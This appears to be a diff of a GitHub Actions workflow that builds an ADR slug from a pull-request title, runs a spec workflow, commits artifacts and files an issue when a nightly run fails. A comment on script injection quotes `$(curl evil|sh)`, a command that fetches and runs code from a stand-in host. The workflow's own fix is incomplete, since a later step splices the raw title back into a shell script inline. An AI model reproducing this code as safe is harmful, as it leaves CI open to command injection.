+      # reported both, which is the point of running it over every workflow rather than
+      # the one the defect was found in.
+      - name: Install singularity-adr
+        run: |
+          set -o pipefail
+          ./gradlew :adr-cli:installDist 2>&1 | tail -5
+          echo "$PWD/adr-cli/build/install/singularity-adr/bin" >> "$GITHUB_PATH"
+
+      - name: Extract ADR slug from PR title
+        id: extract-slug
+        # The title is attacker-controlled (any PR author sets it), so it must
+        # reach the shell as data, never as source. Interpolating it inline —
+        # `TITLE="${{ github.event.pull_request.title }}"` — splices it into the
+        # script body, and a title of `$(curl evil|sh)` would execute. The env
+        # block binds it to a variable instead: the shell reads it after parsing,
+        # so no metacharacter in the value can become syntax. Found by actionlint
+        # (`expression`), not by any in-repo gate — the reason the workflow lint
+        # gate exists.
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          TITLE="$PR_TITLE"
+          # Convert title to kebab-case slug
+          SLUG=$(echo "$TITLE" | sed 's/[^a-zA-Z0-9 ]//g' | tr '[:upper:]' '[:lower:]' | tr ' ' '-' | sed 's/-+/-/g' | sed 's/^-//' | sed 's/-$//')
+          echo "slug=$SLUG" >> "$GITHUB_OUTPUT"
+          echo "title=$TITLE" >> "$GITHUB_OUTPUT"
+
+      - name: Run openspec-change workflow
+        run: |
+          specify workflow run openspec-change \
+            --input "slug=${{ steps.extract-slug.outputs.slug }},title=${{ steps.extract-slug.outputs.title }}" \
+            2>&1 || echo "Workflow run completed with warnings"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Commit new artifacts
+        run: |
+          git config --local user.email "github-actions[bot]@users.noreply.github.com"
+          git config --local user.name "github-actions[bot]"
+          git add docs/decisions/ openspec/changes/ .specify/issues/ 2>/dev/null || true
+          if git diff --cached --quiet; then
+            echo "No changes to commit"
+          else
+            git commit -m "docs: artifacts created via spec-kit openspec-change workflow
+
+            Created by github-actions workflow"
+            git push 2>&1 || echo "Push skipped (no permissions)"
+          fi
+
+
+  # Nobody reads a red cron run. Open an issue instead, so the nightly failure has
+  # somewhere to land other than a scrollback buffer.
+  nightly-alert:
+    if: ${{ failure() && github.event_name == 'schedule' }}
+    needs: [static, tests, android]
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
+    permissions:
+      issues: write
+    steps:
+      - env:
+          GH_TOKEN: ${{ github.token }}
+          GH_REPO: ${{ github.repository }}
+        run: |
+          gh issue create \
+            --title "Nightly CI failed ($(date -u +%F))" \
+            --body "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
